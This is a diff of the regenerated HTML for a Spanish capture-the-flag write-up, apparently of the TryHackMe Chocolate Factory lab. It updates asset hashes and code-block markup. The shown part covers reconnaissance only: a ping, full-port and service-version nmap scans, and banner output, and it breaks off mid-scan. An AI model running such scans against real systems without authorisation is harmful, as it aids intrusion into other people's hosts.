@@ -28,15 +28,12 @@
   
   
   
-  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.ba3c93eed0aeb98782cc7facff4061766b882098397aef2ad5b6fcc9c9c188720d602d8f19bc39a3160688e4f626e8019106275a1f81f9a73021cd49edf8082a.css"
-    integrity="sha512-ujyT7tCuuYeCzH&#43;s/0BhdmuIIJg5eu8q1bb8ycnBiHINYC2PGbw5oxYGiOT2JugBkQYnWh&#43;B&#43;acwIc1J7fgIKg==" />
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.190378c3e0c2bece176090ffdacfc74896432431f64d10f1673ecf3b69aff3487ae0721145f8b5c9dfb86b0110015932ac5bed2af9a76add8bd979539d6ad216.css"
+    integrity="sha512-GQN4w&#43;DCvs4XYJD/2s/HSJZDJDH2TRDxZz7PO2mv80h64HIRRfi1yd&#43;4awEQAVkyrFvtKvmnat2L2XlTnWrSFg==" />
   
   
-  <script type="text/javascript" src="/js/appearance.min.49025a779c36ad37a5bf9f1cc6bffd35ccb69ce15560ef1b10057ddf31576265b19f8bcc1733207336c9144926f7b18aea2e5895f29e858b24271332a2fa5cd5.js"
-    integrity="sha512-SQJad5w2rTelv58cxr/9Ncy2nOFVYO8bEAV93zFXYmWxn4vMFzMgczbJFEkm97GK6i5YlfKehYskJxMyovpc1Q=="></script>
-  
-  
-  
+  <script type="text/javascript" src="/js/appearance.min.f94f4c4636d9e3ec8f5ee53cdc8ffa3d01bf87cd92ac85e6797550b1e2b80dc9118d838f3eb24c55109352455e72ff082dfe560283154e5a8f87fd75107b59c4.js"
+    integrity="sha512-&#43;U9MRjbZ4&#43;yPXuU83I/6PQG/h82SrIXmeXVQseK4DckRjYOPPrJMVRCTUkVecv8ILf5WAoMVTlqPh/11EHtZxA=="></script>
   
   
   
@@ -46,8 +43,11 @@
   
   
   
-  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.34ee8372ff77835535e486c6ed01ff6993374a1cec8108898cad793fc6ae7520778e24db68e085c762d25af6fa7d00b57d7a791438dc68b676581f8c8344f6e0.js"
-    integrity="sha512-NO6Dcv93g1U15IbG7QH/aZM3ShzsgQiJjK15P8audSB3jiTbaOCFx2LSWvb6fQC1fXp5FDjcaLZ2WB&#43;Mg0T24A==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js"
+    integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ&#43;dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5&#43;a8AgFUkA==" data-copy="" data-copied=""></script>
   
   <script src="/js/zoom.min.js"></script>
   
@@ -71,7 +71,6 @@ Para empezar lo primero es comprobar si la máquina está activa y que OS tiene"
 <meta property="og:url" content="https://d3b0o.github.io/thm/chocolatefactory/" /><meta property="og:image" content="https://d3b0o.github.io/thm/chocolatefactory/cover.jpg"/><meta property="article:section" content="THM" />
 <meta property="article:published_time" content="2022-12-13T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-12-13T00:00:00+00:00" /><meta property="og:site_name" content="d3b0o" />
-
 
   <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://d3b0o.github.io/thm/chocolatefactory/cover.jpg"/>
@@ -886,14 +885,14 @@ if (!doNotTrack) {
 <p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
 <p>IP Atacante = 10.10.10.10</p>
 <p>IP víctima = 10.10.250.47</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ ping -c <span class="m">1</span> 10.10.250.47
-PING 10.10.250.47 <span class="o">(</span>10.10.250.47<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-<span class="m">64</span> bytes from 10.10.250.47: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>52.3 ms
-
---- 10.10.250.47 ping statistics ---
-<span class="m">1</span> packets transmitted, <span class="m">1</span> received, 0% packet loss, <span class="nb">time</span> 0ms
-rtt min/avg/max/mdev <span class="o">=</span> 52.300/52.300/52.300/0.000 ms
-</code></pre></div><p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ping -c <span class="m">1</span> 10.10.250.47
+</span></span><span class="line"><span class="cl">PING 10.10.250.47 <span class="o">(</span>10.10.250.47<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.250.47: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>52.3 ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.10.250.47 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">1</span> packets transmitted, <span class="m">1</span> received, 0% packet loss, <span class="nb">time</span> 0ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 52.300/52.300/52.300/0.000 ms
+</span></span></code></pre></div><p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
 <div id="escaneo-de-puertos-nmap" class="anchor">Escaneo de puertos (nmap)></div>
 <h2 class="relative group">Escaneo de puertos (nmap) 
     <span
@@ -902,38 +901,38 @@ rtt min/avg/max/mdev <span class="o">=</span> 52.300/52.300/52.300/0.000 ms
             style="text-decoration-line: none !important;" href="#escaneo-de-puertos-nmap" aria-label="Anchor">#</a></span>        
     
 </h2><p>Ahora empezamos con un escaneo de puertos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.250.47 -oG allPort
-PORT    STATE SERVICE    REASON
-21/tcp  open  ftp        syn-ack ttl <span class="m">63</span>
-22/tcp  open  ssh        syn-ack ttl <span class="m">63</span>
-80/tcp  open  http       syn-ack ttl <span class="m">63</span>
-100/tcp open  newacct    syn-ack ttl <span class="m">63</span>
-101/tcp open  hostname   syn-ack ttl <span class="m">63</span>
-102/tcp open  iso-tsap   syn-ack ttl <span class="m">63</span>
-103/tcp open  gppitnp    syn-ack ttl <span class="m">63</span>
-104/tcp open  acr-nema   syn-ack ttl <span class="m">63</span>
-105/tcp open  csnet-ns   syn-ack ttl <span class="m">63</span>
-106/tcp open  pop3pw     syn-ack ttl <span class="m">63</span>
-107/tcp open  rtelnet    syn-ack ttl <span class="m">63</span>
-108/tcp open  snagas     syn-ack ttl <span class="m">63</span>
-109/tcp open  pop2       syn-ack ttl <span class="m">63</span>
-110/tcp open  pop3       syn-ack ttl <span class="m">63</span>
-111/tcp open  rpcbind    syn-ack ttl <span class="m">63</span>
-112/tcp open  mcidas     syn-ack ttl <span class="m">63</span>
-113/tcp open  ident      syn-ack ttl <span class="m">63</span>
-114/tcp open  audionews  syn-ack ttl <span class="m">63</span>
-115/tcp open  sftp       syn-ack ttl <span class="m">63</span>
-116/tcp open  ansanotify syn-ack ttl <span class="m">63</span>
-117/tcp open  uucp-path  syn-ack ttl <span class="m">63</span>
-118/tcp open  sqlserv    syn-ack ttl <span class="m">63</span>
-119/tcp open  nntp       syn-ack ttl <span class="m">63</span>
-120/tcp open  cfdptkt    syn-ack ttl <span class="m">63</span>
-121/tcp open  erpc       syn-ack ttl <span class="m">63</span>
-122/tcp open  smakynet   syn-ack ttl <span class="m">63</span>
-123/tcp open  ntp        syn-ack ttl <span class="m">63</span>
-124/tcp open  ansatrader syn-ack ttl <span class="m">63</span>
-125/tcp open  locus-map  syn-ack ttl <span class="m">63</span>
-</code></pre></div><table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.250.47 -oG allPort
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE    REASON
+</span></span><span class="line"><span class="cl">21/tcp  open  ftp        syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh        syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">100/tcp open  newacct    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">101/tcp open  hostname   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">102/tcp open  iso-tsap   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">103/tcp open  gppitnp    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">104/tcp open  acr-nema   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">105/tcp open  csnet-ns   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">106/tcp open  pop3pw     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">107/tcp open  rtelnet    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">108/tcp open  snagas     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">109/tcp open  pop2       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">110/tcp open  pop3       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">111/tcp open  rpcbind    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">112/tcp open  mcidas     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">113/tcp open  ident      syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">114/tcp open  audionews  syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">115/tcp open  sftp       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">116/tcp open  ansanotify syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">117/tcp open  uucp-path  syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">118/tcp open  sqlserv    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">119/tcp open  nntp       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">120/tcp open  cfdptkt    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">121/tcp open  erpc       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">122/tcp open  smakynet   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">123/tcp open  ntp        syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">124/tcp open  ansatrader syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">125/tcp open  locus-map  syn-ack ttl <span class="m">63</span>
+</span></span></code></pre></div><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -975,351 +974,351 @@ PORT    STATE SERVICE    REASON
 <p><a href="https://pastebin.com/tYpwpauW"   target="_blank">
     Función extractPorts</a> de <a href="https://s4vitar.github.io"   target="_blank">
     @s4vitar</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">───────┬──────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼──────────────────────────────────────────────────────────────────────────────────
-   <span class="m">1</span>   │ 
-   <span class="m">2</span>   │ <span class="o">[</span>*<span class="o">]</span> Extracting information...
-   <span class="m">3</span>   │ 
-   <span class="m">4</span>   │     <span class="o">[</span>*<span class="o">]</span> IP Address: 10.10.250.47
-   <span class="m">5</span>   │     <span class="o">[</span>*<span class="o">]</span> Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,
-       │ 113,114,115,116,117,118,119,120,121,122,123,124,125
-   <span class="m">6</span>   │ 
-   <span class="m">7</span>   │ <span class="o">[</span>*<span class="o">]</span> Ports copied to clipboard
-   <span class="m">8</span>   │ 
-───────┴──────────────────────────────────────────────────────────────────────────────────
-</code></pre></div><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target
-PORT    STATE SERVICE     VERSION
-21/tcp  open  ftp         vsftpd 3.0.3
-<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
-<span class="p">|</span>_-rw-rw-r--    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>       <span class="m">208838</span> Sep <span class="m">30</span>  <span class="m">2020</span> gum_room.jpg
-<span class="p">|</span> ftp-syst: 
-<span class="p">|</span>   STAT: 
-<span class="p">|</span> FTP server status:
-<span class="p">|</span>      Connected to ::ffff:10.10.10.10
-<span class="p">|</span>      Logged in as ftp
-<span class="p">|</span>      TYPE: ASCII
-<span class="p">|</span>      No session bandwidth limit
-<span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
-<span class="p">|</span>      Control connection is plain text
-<span class="p">|</span>      Data connections will be plain text
-<span class="p">|</span>      At session startup, client count was <span class="m">1</span>
-<span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
-<span class="p">|</span>_End of status
-22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 1631bbfb51fcccc12148ff0d833b0089b <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> e71fc9dbj3eaa44b672103ceedb1d3390 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> b44502b62478gea9065f6c79448a06555e <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp  open  http        Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/html).
-</span><span class="s1">100/tcp open  newacct?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">101/tcp open  hostname?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">102/tcp open  iso-tsap?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">103/tcp open  gppitnp?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">104/tcp open  acr-nema?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">105/tcp open  csnet-ns?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">106/tcp open  pop3pw?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">107/tcp open  rtelnet?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">108/tcp open  snagas?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">109/tcp open  pop2?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">110/tcp open  pop3?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">111/tcp open  rpcbind?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   NULL, RPCCheck: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">112/tcp open  mcidas?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
